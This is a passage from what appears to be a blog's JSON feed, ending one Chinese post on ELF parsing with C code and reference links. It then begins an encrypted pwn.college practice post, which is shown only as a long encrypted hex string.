i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d           %-#6x   %-#x   %-#x   %-#5x     %-#5x    %-#x\\n&quot;</span>,Pro_header-&gt;p_type,Pro_header-&gt;p_offset,\\</span><br><span class=\"line\">\t\t\t    Pro_header-&gt;p_vaddr,Pro_header-&gt;p_paddr\\</span><br><span class=\"line\">               ,Pro_header-&gt;p_filesz,Pro_header-&gt;p_memsz,Pro_header-&gt;p_flags);</span><br><span class=\"line\">        Pro_header++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>ELF(5)手册 </p>\n<p>ELF官方规范文档</p>\n<p><a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html</a></p>\n<p><a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html</a></p>\n<p><a href=\"https://blog.csdn.net/qfanmingyiq/article/details/124295287\">https://blog.csdn.net/qfanmingyiq/article/details/124295287</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/401446080?utm_id=0\">https://zhuanlan.zhihu.com/p/401446080?utm_id=0</a></p>\n<p><a href=\"https://github.com/jianhong-li/ElfReader\">https://github.com/jianhong-li/ElfReader</a></p>\n<p><a href=\"https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=591986&amp;highlight=elf+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD\">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=591986&amp;highlight=elf%2B%BD%E2%CE%F6</a></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/",
            "title": "pwn入门-21-pwn.college-Fundamentals",
            "date_published": "2023-03-13T10:54:41.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"e6c7212bcc454d4831365f258f1eabf76f78a92497ff504b3f395af6e5f2a727\">297f05f60dc60df7ad3147a64b55ba41c62b02eecf963d3abf8519631d063ce769ef6b9802f4b9a3153db1868f9ff2c2aef9f0da83f144a7ba7d06ffb2412e5ae963f59937b4a98899025e6f5a2c54f21d97aad06ad44cdb19b3fb8ea14663db92f0948d76b5eed9582ef2e94b23fad026c75aa1615c5867defdfd793725940c59f7faec0dd9391aeb40ce7f7d285a05000b0ef3e7b2d2b035e3183f1235949af5778500615d844ba739ecfd4728cc1e5c89d60c36115fb07628a106073693fcb64833bc1238442e014da86d627aa05e1e2a79743c743f82dd20e7bc183a1fd426d91320856fdb3979d509559e78c0cff86b5744a742da75c42bb75c8cb0db1e79a6458f30691eea061fad6dcdab03dbc88ad98c39405c0681c8bb3df34cbacc010405211a5cafe23d465c77fa7272c1c738d27b7f2e4c87120de0f425ad62ad1ae344f4d557405aa891a474d655bdc58d5ea12c7f0ae7af39b92ad86c06d1ef5c7d0d52e215bccb394cc4d89ca580d9742ce395417881e934c6d580d2adceca465dd2e83dc05e27be789b3966c70d210f958f6ab45525685ef833c0242c5c39a137f67b2d9710d7724e87ef388ba8642dd37071de19ffa4d04df7116fb34adb823d5a8104e485b222d783797e3a42cb2e8a1395226c5a3c830b24e35e003a25941d12d6733bef6e5979cbb98e2a7fa29c8db20ad626af9f28022f8ba4d5ca1dc528132117fa3bc278ee8a78f3ed1f8047e4f20885ad5a00f93c35bc2971d91c0494e3f989501d164a2165cc3d8d86c0c8de0e1de254236644e1764cb3840250d0e924ba784c2d890acab988dbdeec95dc4409ecca1782c2b13aaf3c0faa8ce0040d032d1399e08273bb5f5d31f00fd9ac892f18a17d3f6307c8ff87b1ff71bf3b4fc2c24eb18627412bfed08872aca241b20df03c232974072bb5ff90a6b1bcb506f1a32a227e7e34f678b9155b322a152496c8d6f052f70b2690014a201cd4df2a038ef55e6a0d801fe18164e08b84d706b414513c1e97610c19a10e2155bb7b6cca89a3af8ceeb5bc87b3a09ad985d396683f32ea7735332b15eb3934c7a3da096ab144d3421b66124a09ea4f4c8f614d081e42a3b4c48576eafa46c059350830dd33f2036d49e9a0681de1ee0eb8c13bb8ff9a0b27d6fdfb4b516a110c487a6957da9e1770963e267423d5f24d8ebf9858dcf33e8376ce24199ce72e33b5e5cf2d285479b5e0063ad875175826268a14fd66f2f62681310b17920cb617a583e62309ca84182f5e9517ec39130d5e553a315e55e9624b6284b947f7d32cef56a81ad7eb23b3b613391f203b601ffa40848b0f049e6032ead00611db87a139c0ae476557b01ea04ee63900284668affba9466a8087cdf791de4b356fbc86e89bf2ede5047be9fd6854ee8a97caa381d3b25f9d2a1f85bdee9a807fd50cc5d0ece25b4e71ebb56a9e249a370c972237bdfcd8e35857bad0b241e3f70053eadc92aaab9373bfbc32bb1ccdabeece7f326e8c77c725acbcdbf9bbbea8b1625c4c71c294c9d9f7c0780e35f8b79afa1e5db193a92c225f7b63f46d5f7f2e922267437ab0b50d47e96646640c0d2cabcf739b4ecfe014720042ce4505dfd3ca3d3c9bd31cbfd136e2700b77b23037e862663ead7c7ef014535000f17ba22d20dd562b58a853415112882bc794699647b0fcb8fb53138fd009db6d8ee1ab6e193fbab6580c6f9fb2f57dda67b290e6e495d73345c9afeaa118ced4f7d9e01d9272fb0d7d43ea30dedd8ddbc3dcf15ce9d95d40aa5bc29886d0e2dcb6dd51dc8765895372ebd694eef43e155bc24b801bfa78c1c627ca8e181b5956ed318f232eb6b88039d37f263d77831a4cf4ed9f8467307d1145628f0dee8b24b927123d5186f594fc75461ce92d3d9752b5e7f9e3d3081f9d9577f6e2f9f34a1d4dd98541d19864707929a26e04b3dd9efe088ccb9e3b63d4961c12839a4fc66db74043ba2f95e2116e3f5a5540a4ddd1858e97a0cec07bf4cf307deafadbf8b58e9ee2fa10e41dc697d7fea442289ce377f1e448522dddf040fbe389dffae14a48939d78b042aa63912185cd24576b3677ab30b41fc1bd8841218790e0d6788726b44fdba293c0bff7d15e32f6baf68b1a542e0d4b19a219d840682226058cbe8f3913d25dea046afbddc5ced6e61d49e8331bb34dd4289fa956435db0fe6214e580a39064d71e19743c8fb7bd74cef427dfd0d1d2ba25e12a74fb5c9db8ed72906fb2097dd4e740ee1c8343c78cd6f30d5bc08aba66ebb444721a087b68c1091fb8259895e7232dec7d8f441649c6d1a34568e0e18fbc1b4c12bfbad51f8fc4db36fe94d1292607c620ac544100c5c753c60da5b876070d9e0a6ed1595edfdb7c45a5656fd09263ceabe35e78ea28e647ae2317a4d68da079d16749b181306cecdf35a07af05445b343c4558a3a499e5c9400938909f58ac7f8fc171a949fa35d1d745e925af9087f1d9c3e945696e43c0d0ef3d57e9d001fdc036c22206e6b472ca6539e11b4ce3f71b9b59c5b74fa5340f92dfb6e7ffcc306fb29bae8966d36fa20c08b1ae23150dde5b68fe8a36c7d5dff32811a95a632bbb54d87c0555b57be7f8f72fd9fac845bef90c41016ef4788fcf68749cdc0a8d55875318eadd4540e1ede54d7a83298f1d213bff575f83b2f0548bd9f15382014b4bae8fc0605b91d1746724b382325c6a8a63cb4943f0c97ccf0162cab55202868fd832293d9f9dbcbbaaa8f358b6b6011a557498a7f3d17af00c2834da32a32d338a3841108440888cab18271d3341b36cc0774c304d46427149e70cca3c2c9528cbb87aa1fa1899b33448c0c599dd07289142a83d6aaec14aa57d878e816be1c5e7f926aa4a86c7d72ab1538142cefb9274b49de3d24d3c06af2e94aa0a9f40daebea51d20a582781ef087326b56c1402bcb6abe829d9d208b0a16d6d82840d4a3fd2849375a6a5c66692ba5d9ae06087010851cd1600a99052e27dd0d2f313fd49a500ea09b507d605644412d8bb7de72ddd3b56fca2404dc49f56f4d7608f03f5b14e3350f83ebb872aa5a20d08954ef4bae99ed63159d4816571712824d188b767fee346956b0f35e8d2297041889bc216e2b8c46fc532307b497ea2b913f96b5e1343f64680888b9c60134e48fefce3d747aff20796dcdeaf1ae685529c5793cae349a3831e56f41b858699e37e9ad9ae69a55f3e9040c581ccaa004106701cbcd060bab6d8b067c36dd16a3e5ed02ec326a2d90875993e435b2233358c0cdc5a8d8ecb9e5c572e7fc4d5bf2680ba77f85863fd9028bfec10dd8279041043c6d9da4d0eb8bd79aa906fe0181de8d6d94a87fa80849e72b327394ac7303b7a4c776a9f937e535420a1d879c5ccd6a3de790f778660a9b0dd6baac6255227541a06a992e61cf7b2c474afd211c672f7db10cedfeedc16f2e37dd801481663d564639e457617fe61bd4aa36da061e7511c951b7fe5a784d4b6cce7a49e7a51465ce1039eb58d9b29c31aebea6b1d2cf38bfe1b1cafb6dfb93dfde133e4644c930b969b9bec3ed44757031beed9b8ca834dc38fece489c166dd8d73e56edd157413bfb137061102c43e0834cb1a77904bd5150f85a1dea5b40bcd53678ff22be2552862cc4710fb3d39d1752d93b7d6ec6689fbb1e7fc74f586758a6c3e80ac0b0918d381d79c563dec5974bd911cc8657046a647ee663f4efd5d3155854a5781b6f2d318c008fb5d65943c4aaeb85e7287406e6bc7302cee1846149e0df8404104c072cd311de2e9a68e530ba7217fd294e9d6657ed41732f14dbc57347949498fcae90b480b7fee0cdd88efc22d64da8ae8fc43f153c2b6157851a7ed516d81045f04c0ff1b08669e75e20086f7ba8a4bcfebae6832a91b9b619c330ee1548b240db7adc05a7a075e4c4561be339482eb4ff17d8e714827fcadfa2f1f2b8eaa21d768374551625b2bf9cb31a590def881407861b54a2968dff49bf2bbc77e2de3d45752ef59e4c689f95eed3fd25ca5ec0941d4cc32f1696b26de6262ccc7c1f3037aa67032c2592158c3ee4016d945a594e8f6af45ed4dace061367c162cfbb899cb580925739c85e2bec5f590c6f5e71e90b65833e30556870fefa4c72d7557b14244ed0d333877500f4456d07ae65e4ce7b9689f7d8a81238e200200c1480b27de584afad3d90ae6829effb4ca658846e5a5ca515788ce207c2ae61179b9de3337250b51f5608614fdba1d1b6410dee32f15ebe71d93ea59877a55a160b365402229d4a5e2b2e25138eba65d590ae4c73a342ef665b81d680afc6f79fa8cf9177b9c8ab8ddc84da69614671283685edb07899f5becd856a1bb3a52b547bc48671ab3ba0a9912ae593f99132b99f43d3000cb9af87eef979c58461128a1a0f0f60120b3c1d1afe62da705bd397d7166f68903e81eb46a501db3ecf448acf843fbe19bddc58c50feaebf947e25775a1258511a4a5a9dad1d2ff991ec7469ff7db8aafb1314f815668beb984eefe86a7e51cf1ce2bed4bdc7eec0e96f3b02c7afa9b1b7163fa395c36e6513acb40fd65ea84f51b7f22965698eaf61972c3703b73a2a0f4ace97f2b5fb57320cfa94a2ac5cda0f45bf5cdef48e3de4018fa9547fde72c6f2809d3fdc650bee212b606ba34c2304f5a138855d32e6b5fc67b7927c1e7f0543ec96934382c816b7eced73bae98c3a72c893d9e0ec92718daa9a4460a2f6752ca354ae3dc0f8d814b2a33fa49194a8c3ced0ecb578cb3a2c8165055d5afc0a292f72f588c8d87527f1d406f678666a581f58126305d15dfc83572bcc75b5422feb5563e21f0686b14b422eb5a2340264ffb7d5865287306662035a9172a657545f83e256f8d2dce2b152749f07841580f3779b8f45e2d8ecb4b76eea5e60286889d26ae6339a5d1de0e2c7e6c31a4a7fbd01b52033b5e3f451a20c3b600ac26d09c105875b85099693d149d7ea1a1eeaac9ff74fc0281c6cf6803abc0c2f4c0c4ea37863498026afc2e6e382657555d871ac34ce286c02d9171ab5de83bb367a94da2f6646f1277612037ff90b144270291acb616b61e99abac9d619a9eb75826975258b9536568950a674e82eca34388efa60afde996b3162136b0e0be606d012bc6f324b1a18432ced99231670ffaf114a96a21323858242991bdf45b415fe5e324cf4c3562c8caca048e753dd40e94e5b237bd755bdf89a188bb612a49a33e707deb9b62434e5a8d494ad4b3641b13f331b2955bd6931007a2a44a4fcf0f08fdcada0a9895ef11a95ca6db224b438eb272533a7eb6990d1ff151bccffd1e5d04d1172798c98b0630d27e8c2290318c1d42122da08412d55e6dbf88b21baa1718ae0bf258f9d4d420f35eefa2360e206c2ca34f8bd8833c059f96121cf0811df73258fcd4898e29b6de02f14d5733d10da0046c459df981d35cb778577f180b963c2c5f617131b16169a071c227c9f8d8be1583c12ae9b0ff29137c2793577c4efc891e30c45d89708ede837967b3cabdc1aa03e133f4738b5492941538475d83cfc1c50ec0f94fdbd0cfffa65259dbc06a90fff86bfc0c905eb4fa196aeb0ec5f342aa37d27795c9139004fbda56636dd0e537fe9a1494fbbbf6463af14f1bf12377859b5aef5246d14a448edc9999208418d039e40b77550b6efebff89ffcb889b2d2067b84f1a6f5cd60b1e9fe5daf46e0dc16575cbc7fdc75887db83a51d219c2962f03477c37f3c0c180b66972dec3c19cf14941512b90092c9d36d3054a94edcd3a0841f54e3097c4b0bb24d1607188b982ac2b130f13826fe1771fae5bc77d1e45ffe21c85b2df7adb42e0c62b8285d01875fed1753027b691eedf60cb030ab5080655f4b3a5ae475626af15b1ab933d124b3d417b778d0bc608deabfe069441ae490fb271dc1ae5f194fb31155e0bf3815d844fc5f7ae23ecd053c61548ae5dce71402227c42ba1115fd3fd4ad22903f07940740d577f661ad7125b23e869c5ef616330ecb4f65d65babb25e4a52bbf199e1edea71b0f8193b437d3b6dd55837eb18d9000b889128637a42ad14fc1b1c12ba3906742bcc1f15333c39cc0598e4168a78f70bb7aa173cbf929f703b1f115266cecd4a7eff44847623eef1fa84fdce65447127bb75595526b60e471793a4f7c99e6e955ab95b642a1fc7cb5e6e3b6f679f095a7732d60471af8f45cbaa36fbfb32653d5ee40567ac28d397322a8d94ef49ff015e69b6c08840aa1390abed4841412e9d2ef31a9edbb0f7650ba4921453cc0615f5c103fe1ff6b50f08fe3c63d67d3e33220c9ee122bd2d7871bb97b0b2d4c724e040fc4e41b943d42028064a2cedb910d70a73cf9b0b7c4423e6a783fa39973194237d8322464e8ed2b3c40f5bdacd4f4e86d384365a31694e2dc63a6fb9e0e6b05d0497594fe583f3c2ccca393caa969e8abeb2c6e8b234f39e9cd3b310f3691bded952df057ea17077d190ee7a75dce5bbee3d2906c39751de287b949bb7358c0899cc4f6eb0e2839df3c0dbdc1f0684d8a7c8b07ef7a4ae2ef9c861a407e7bc45412555eb475dba8692b6b2bef7a897daed0d93456677b903212afac9109e0e98f9524d25c1fb665c8422eb9288bbcfaa379015612ffec8abd0848d9386c4fe8b2140ac16cc2f5fded8ebdfe906601bb5f19581ce061b5c9dee6c69bd4dcdee237dd0ae550cd677cf5d9058613ab27c822d74179ba787de0278b6e4cef2b79ebc96db53faedc6e26329fd8a5d3fd1c9280fbc833e5f88f2ab6f3891adf4f9c5912b1a16d2c1252529e5f4d2ab3d71ff3b3b04cd3d8a99f67d09247bc8ad0e4b1418761f885fef987689837ba4262c1a17345af07c09d00d648ab50dc6bb6142ae66e8be26dcdacc04cc53e353038a97ca57a5ab9004f28938957b17f074529647969423a500d95a21f4173472d00fdc6f73397ceac1dcd4d28f77a45570f7e0278c56045c0c92926c33bbb1bff1f8026bac53f0d2eda75231d3d8fd7354aaec7e84a1f71f31e047d9e72f73ede0a203cbd489343b2b41429fedeac09337058fe43ed3a78ea1afbbf7b400ee6612843a554ccfd5cb9f4845c3b669544f9bb386cffa7c0e1d039ffa22e5731030dd34799de4d5ce36f1bc3ba2386c0e7ffb0318c1e685c30977351b56e2ba0ca3b99f75bbb5542177625b4a99174272e9f25c7f077ff468e46783b9d0ba0f049d73e81fa7ac3fc80caebe46b82b5968f906846719d7d4364f8712b49e895db7ac92287a7c1ebe3df6101d81d30f7a0c2ad4b203aa6ef1b3b83ee0f7a54be7725f9531a87c8fd47a15a753537f711e25765819f8a50aa1aeb292ff28f1b65dc0d4972d95ea418f7f829731a0a852d6e692fbf32e39f62769f9add6731ebaeb21afac259ffdc3ec0df870f589a9469290c9539f91e502833571269aa2bcdbabfa97d737bf40bd89649190232f3c4dd50486edd312fd8f2225c398a29e06515d9e5f454a08159e24fa100f90cf03c072c4b54f77dd4863c7e11e0a560300f19816223876fc2a284f7c8c57116b34de12980c07dd5ab245ba423fbe6ff71f46591369dbbdee9e58561a4acdbc3f108f5fae8a59ea620ff73a2d09ecbde5bbb42fd287c25362e24ffea261fd6ebfe2293db4a73d38fa9b008b64c7823e753a65b4ebe40028e7f9545e945fee484b5b2906d4be2be04c33bd348a0d4e8901a8a1426585507224ac39d624e4b644b436c28e945e5e225ea8d6e314256190eaa5cdb211f3c635282b021674c324504d0fd0029ed21aab80fe8032fb648d08ab809a59a2f777919ea06443470d08eb61accd1750c5b2862fc0efad15c6c0f7850902ef40889f34f89093cda1101bba531889a23307032017dcac7b787ce5f33d3f38c1c713a360df3379c13bd690ce1a638ffc97a810772c8d81d5c13d291036de66b5cf1d75742821827d73775a55b27fc18c6f478984db902c977d30a819f49f819589c38fbd76e3eb798666145cc3c69f0c6db7b44308be69fde219db832d8c84af3e82b4a5a78b00fefcc06654a095db53db9c7178b1b85094b11f05d6fbd2abb702822cd929b4a71e7819b11fc720c79a226064e1a520d4e0b5b8408fbed01b48493bd1dc210946feb86fcc7184169637bf4c8f382d3d4eb93a870ba0f1777525e27b06aaf2846844642b96ac741dfd590867c8d1303fcf63b75c16cc9d2d1f0ad33bbb0c5249b95f8179d2a02c8375b5a094fb37b2571ae8d96a995a5bfddbbdd3587ddc54bcd45b4adda20b88a178af92c7b35889d429ab8bf101bbb97d0f6cc306db6e5e248413d572f2469fad0cd7c37e47ff4f8c4da50b5e13b9e8b3e8695dfbd4ed831cab1b5d390497286ef821bb055cee19749daf35a07b066b0702bdd40ee2c51f8ae640433e39e6fd654e556a8bd1f7efc44acdaec83b28fa443ca79d687c3b94e0a6e13c9dd4d9e1f68a14aeee503c877423db3d8743d87d161bf408e59296aac45463dfa5c9eca75634715f3576e9e3859df19ed8a24c22e4fdb03cc16d7f021035d27b43293dcd042d4ccbf3d9dabaa4091d76607252865801416bfdc4533bd39c9fa6fa8b8b88f243dfecfc36cd9192cd04264e1be70166afe8b16bc0865161d40a27b5dc5f26e39535a8ee27d0e555a3703c8f2a2751d5dd895ddc0885160c51daa0a074b74abbb836188914da8878e5a12e9cbf9f78c003233d50450138796f3fa00ccc7ea6834a7d1987f231b94a3526c08372c06b052f7d35e31f5e5a7dd2ee6193e6ac4e21167f9729241a1925ad1e70349e72321fdd30379df8abe6f3512269a1bed8e9e02b6567e8efd71a85bab3181911928b6280c50a1898af605dfde2da8d8ec90877a50f11520543eb7f0faec3e790fbff627581685a03f90a26faf8dfaf569fb8ccdf6f63c9dc9637f81b409e36bcb780e55c466cda9488332347a2e075cd3cd3e751696015c5dfb2cf598bc9b8154b286ee9e6a8bfb14b0d38b78f71559ba18c75f4d427c8c54abea5097501bed08a6968487836309f4707ac50c81365d520f82ef83b9faff12b6d5a499aa810eed4aa1e4cec45d3f7da2c7377c03d1e6fbc778e0430952b78cbc94d3f4de777b518c0718b547e1723c732687127dbe306fb6dd3f11ff8c2016291e806aeb9b0eac7a75c1b013f8cda888ac17fb3c9a750e0eee8e2994b10fccf59ffc42919f18f9fb0d279216b2754388b737488aedf078c739e848255e3b8426f6a3906b287152a18aab2fa414c530499d266b6137ef340257aa78ca3977d99eef066e2ff8623764603423575cfa899f21534bf097736b12a826a534cf7aeff715bb30a0540a3d0d7492006010bfbd07d219f5b7f5773dc23f7db9ad40cd9c207f4e2074cffdf4e85be01b9fe649de73a42bb17d9b3df9150c57ef1c38e76deb54b1caaf53aeda86df06221bafd28a7fd53608e04faa1ad01a0af13fe0da2e9cc14c4e92f54275f15568f38ad7e74900bec868b73ec3c48a25faad09c4c2bfcbef9678125ea95ddc516442bbad0da420e2b438aa247ec3abb53a5c061e9bf257aea8c38fc78b8ef83108de64b38c57ab53ef0d6d465a9e92d1b33b34271056fcdd329fd31b1f12823ceb2ae4cef79fcf43c35dde7a0f4ca6f1832226ad8353aa294c59dd196143745796c92ebe45c37d606ee1b05f9b53ad1b9a438c221d10d38cf7a59330f7437a40f811215fedfbc4d5cc3b360e9d0d4ece854b979efabae70380979697f95d5c13227d2aa5db17003fa995fe146d39f2dc4a561fd1853527882de15ada07dc1e1b085fd65556623ed64a739648c74eafbbbfd32a78a170b266a8d8eebcea81bd3939b1ab50d2ee8b3e26811f831e13b1104c52a15ccfa33a07f07fba1c3657481beb574d217891137800933f261a709fe394d50009305310e0070b531e94fbb03ef171768517783dee7c514ba39f62e469c4d7e9a95b3188718fbf2505c37ab56df9f04beefdcf4080a5f4d47123d1c6a2de6bfc2ee19614fc14de70e4c113b1816a048fd7e7d5b18a1bff43e167e0f4f5582fd20144806b699c25bf19ed16fb351d823614b7048292249905ef90a5467f846241c5ff6298ce8123a0009423716293904fddf9396bbfd1d0fb4b1b53dd519dd09113dd5db3dfa898697744e1fd9bd3e967a4be65f0c599ed838f586e9dda252d4b3b8f49e8c25d06b851238a9e821dc2212796cc315b5f07de9bd0c4d31383336a2914615804da0acc1277eab40c3a705839478289cb3ded911868f5962fc53f42741abf21ae930244581eac883eb56b0134b145d70c608c9733be4d6b91a0361e405514693853547cb4007830c0bec917187f087fd7556689ee933f0ae5a04ca36d177312cc488f1e0f205cd84eaccdd819d47e864bd9c7e22fd9e48efff2b1ccc90dc8deaf89d7e5cdcb6d48c8eb413279d6fc9cc1881bbaa888704e4bdea009240b03919f1a7b518500577f5ddd6ae1a4187dbab16473382a4adbdeaf438796afc13dc665def788c4438b9592c93ff71c5d9ac4488521aa7244bf0524c83679257915d9065e67a130309d957ff55ddfd76e9b88c09a96b198bd43352ea7c703274f47d1988892bd93b2a75af3a0afe8bcdff82e390a5002a078eedf44ff98731bb2aebfeb10f15a6c32cc7e7380363c07e4729531a00a524ff2f11767f66795b7bb780140f8b4305fab778df1e5a0ef94f9e2daa6caf7745586bd4620c4f7f2f7341b6fcc3ad5601c16c78ae8cfdfb60772f331a8646a3ded1cbfecc5de5244a2b2ec33ba29231b41388827216d899d26c556072af3a0af8de94de1a175dc7d71575858685f92b10a84a24d369ced8c4eb2c306a24cbd8f60fda04cea558dead8905c6d8ce769b4be94fd5b0a55e45f3d9b0fe7d05183bdcdb08e7d026c0cbd7ab98712745d7fe0358a8c756bf3eb9399cf24dbb80447a22da80f7419992de84d897a23ee251412020a3dc41b3ea27161a76cd1ebbc18801451e91f9f61e005f5f960e4bd7ba19a40a6a6625e8a5734a9fdd68f80cd8b02bcd9b71fa0dd10bba76fb0f3c3b068aa7ebc8a298ac101965d39d8ef9ee41d6012f86ae6657b6001d94d10ae5e1fbb37a8329620a120f454a50ce6af030c24c2f1ac349d1535b76c87fafc55e64404ac1f8abb76e5a0854e2885ea0c012f4888c62838f94ff02eb2bceb781a87f2c9ce9b27b24734d36d546533ef93c7e3bc470ee708854f6b6f15edc29cb8154b5c26596d2f36f1eef6f7faffdd79719906faba94ce2ab25d37997cdb6b1517bc1eb5274e8662acea336b8164e11677a13d9700c1b1ced745a9ebcd95a8813a10fc5ad89685f57c00df52c1232df3a40b81db59c715cedb4c08844022330dc986368f00b268b094572c705a16ca7904ab5ee3630b16b160b3ea6fe2da5e488e6a84e4734c86acaccdbd8ee599693ba9395bc04eef2c5505199b9b588d74c7f0cf282a80299339a80b10a14eebe8a587a684c8fe0a701af47a4f219f5c6a1a561a9a1363c93aefe93db8d4d729a4704d0c90b63e1ec038aad54560d31626abea8eb75f20ab80c8587c0083c85cadcd9b219cf5b89b5d4c8d3f907275ab6af17c7debb0ba6463e87aa857eac533fa88ba62e102f317e3d3670615f4d3ffe3230c7a7af024af07dbbd37233dd80a070e6aef160ea78f2adb1530d82f8e9aa17b6f14a6e0ddac01c7785d02691e685faeb5005a8640d1e3f111cf2b0c2b7bb93b59a978103f5ebc9d36c32c9154a5652217e662244e0d0d58caa6add1d54bebff821e2e707809760344b77920d570ea628fd2cf22c1649fb2eb0e761751b454c2f6dbd25aff4e4e16810629b9a2340fac39a7d5f78e6eb3ae53e5461e7c879d675a66f26e15be86c1628d76df86101c8c9e59e9414a66ac6c1c3683e20158844b026757f5b0cd209947c99f79dce66eccdb5c874334576a8f28dba1db936a4ee16620b5842d03b3af7ce832f7488e779c4c4612c2b8ad0208845519bb030292b6e47846060f13420e4b621ae48d8fe1f34354a60b3ea39263374744ae4e9f38d66511cc55672a6cf7b66df53077a6481f3087f28cfa80c2e516624fb2ecdd53cd7796a4e06f8d1f1e6ca622035eca3d05715b70be0b17a0a647601c65d73e48ca14e754f00583c0553f9b2f5b47641a26c6a3ff5f7b700af9f7c17405a0faea505bc41ceed0abc37ed62050786ed03748476a23d7d38dd6d0b209c711455e5d3efe9dcd17173911a5de038fab89e3980b3abbf768deb83c6b2608d6e22457e3b7759a4190aa8676e6fec6bda4e0a519cda3e1d3c46acdeae6d51e4b380597d301e102010fa43b25f3e365652a5911ed44354ca68758317665c8a6f9e0f0e624b228070239b4baa0115218718f6c802d6a3cc905011263232638eb94d1cbfcaa10c46372f0e232cd1fc29d0877f54a5f328820c9a9b3f6fd82288b5c13c35e516e627e09d0bc5bf578db3097b48fb45066f58e656f2482f146a9865a8b7212310689d420054e5e06e3f1d0de65c164644f3c678607bad0a40d59c9a0de9718695652e4559450419f48de456d8c083b01676b4aaf358cfcd590e6e7b940dd369f8726d307f1ff3176f31d836c5d6eecee4fb6418fb5d0789e531db8a8a8bac3f48a89453602817f54e7109d1ce723c8a866c5febc61e73ea3fb1ea01095fdf167c5dc7dbec67d7b7676fe722009a1327fe3f601e077d7a148a8eba4ced74d6e941777ff69f297e2e23ad337d2b7796d20409ea6732df6f760e9df868cd36313d391b2be9ab8741503ac9e5569b0f996d0469298605ede63ea8763d73da02f4bad031b912cf23b0e6e45cf5ff8d1b58381650246e77c2abc38a2df6da6fac87c73c7da9a5d730cc1b8828e83c6135cf33a8e2653f4701833e5aafcc6b6fb21809e2d9dce7ca4e85884dcc5c926391c945e73e8767cd0de694ba19271b61b8a3e0c737411957677e89cf8bc94f5b24100a4c5705227dd5354afde80d09073fd69b02c5d2feebd2403cad083788df0d196c6d2482bb2b84ab6987ae87d5b979ebca187b00d2ac9282b20512d37581e86196f4d49429b77a8ee64af62367be82e97bc8bc2d33f0c1efe3782f515692bab5bba58155d361b6ce1877e7fe06d63d490b99d3816803a099e51a5360658c3b565c31a4da10ba255d06c7ac93c1cfd1b8f37d966f5c4d76d13d4fbb3f20ccd242cdd3107b7ac24ba8668cab3097f8c54e3227d3fd5a2abca3ab604bb8aaa59940b908091420ba3f020f7436b534cae2a855d6a472dccc7dad09d331888dfd3bfb56ffd0a1462041eac7baa4e827f267e2ed58be08624efb85d20466d6ee7a723b0dbc618e2a84e10d80faa7df3bb19496a7bc7dd564fe4d78e3fa951ffe47292dfc68a73111255affa70944ae4c625822c42f26b0e2ea90af553e089ef0023f9f90fc9c227dfec70a7f43f404d8665e28b7bdec3a4d28849eb36ba2ba7add5737fc72a09e25136862f56c155a4b74de2b5e668df8b3bdb9fc6f57c0b81d2e973d32458e641e42847331e851b1398995af70f5d19b7e41680dd651cbfc3f6e89123c4c7509353087dcb29887c61a7906e8394902faf4ea7287659ce2f84d2e332b87e3853f946e2ac9c50f96e6386e6e73c6d41515e59aaa5f011c79024751966327663f1107495fff8b076a3ab598d12e1f11b62737851fc164b3d8de1a37f06365bfb7ef8b3cc5c4594bf06262803906eea9efacec85dffde01efb2a08e0306d4ac0921c859000d196df88b8dc6ef8c3705d2a885f44073a032fd9e2fe54cf5287cb0267219165d19cbebcc18ccdcf773ee13461d32c1d7e20fb3cf3d8dbd44ee367e7e07bbb29fc6c5ed561ecea11f9355ceea7beae3d51527f41d0be78e6e8e9377f4150782f3c91ec9980ebd4975dcc4b6db5f1c22020257db135a1fc77f4bb875982e30f476366dfcbd9baa0da2ab8774bd3298bfac60e6644635d95901a6acc83457726286fe9a87b0f4243704e58156155155bd3ba4f89206ce2016f5a7aab0de9c91b0d31d7be7d8aa766a0e70c246892d3dc58af32afbcc253693fe9054c2ad8926e6a56dca75335e5fa9ea797fd4ebd4a373de5baccfed4ee5e166437148db4db7a003b1172064922670447f302fd3a521d6cc0d31b6f3f73616009aca85c7865948564fcf2589041b311f623db43029bdbfd9ce61f03005ece673733321c5e79192ce9499e5f1a70cc60331db234474177bb49cbf23838157b0f903cc6226fedfe6cebda7fc1d236ca94dff6f42a1b95c5aade9b07c3ebc04b40c32ad5bebd27df63be03d10e15f4c2968ad416ba81f04a58f1c535a1b07f092510fea4629b501c7a54fe51edc6e12fb66b17f547e3e3a253c9b948fbe27bacbfbdddab9a03f16039c78ce6fbc65deabd80b927eb6568df87b47bffff05b1af7ef2c50592aaa3afc0a5514ffd737519c83831b23c63399c0ac7e5f3680357a9c1632c2a010abd38512d842429773d8e027ecbab562b8c493fd6b01df5f4accb8597ee33e3ddd2af48d8780f53f658fedcf0eaf0a56d1acd9be91af18766066419099ba6a3a94099b0c4ec40cec46f1fb97389e99ca7658903d4a725702779c09eeed26288f34af388708510c99451c7fde6e2acc4d90430a11ddc670506f88093c25566d3978033bdbc90955e175eb96d3a9e5a963bd94aef4f6c27865427019e231ff186bb4690ca5f04ff48ddfca3b6914aa7a4814bea06ba57853692992863a948ba1c811d0a035e8bd69e69e0b7777936b2bdfd8a0d9aaafdf04d297737e21a1d23454a0484fbc1af6a